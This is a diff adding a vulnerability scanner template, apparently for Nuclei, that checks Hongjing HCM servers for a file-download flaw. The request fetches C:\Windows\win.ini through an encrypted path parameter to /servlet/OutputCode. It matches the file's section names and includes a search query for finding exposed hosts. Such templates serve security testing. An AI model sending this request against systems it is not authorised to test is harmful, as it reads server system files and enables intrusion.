@@ -1,0 +1,25 @@
+id: hongjing-Hcm_file_download
+info:
+  name: hongjing-Hcm_file_download
+  author: sb
+  severity: critical
+  description: filename=C:\Windows\win.ini,加密后为 Ix1E5Anj26gg4vfnak8pSKVU3Fi5TGhY，
+  metadata:
+    fofa-query: body="/images/login/line.gif"
+
+requests:
+  - raw:
+      - |
+        GET /servlet/OutputCode?path=Ix1E5Anj26gg4vfnak8pSKVU3Fi5TGhY HTTP/1.1
+     
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[fonts]'
+          - '[extensions]'
+          - '[mci extensions]'
+          - '[files]'
+          - '[Mail]'
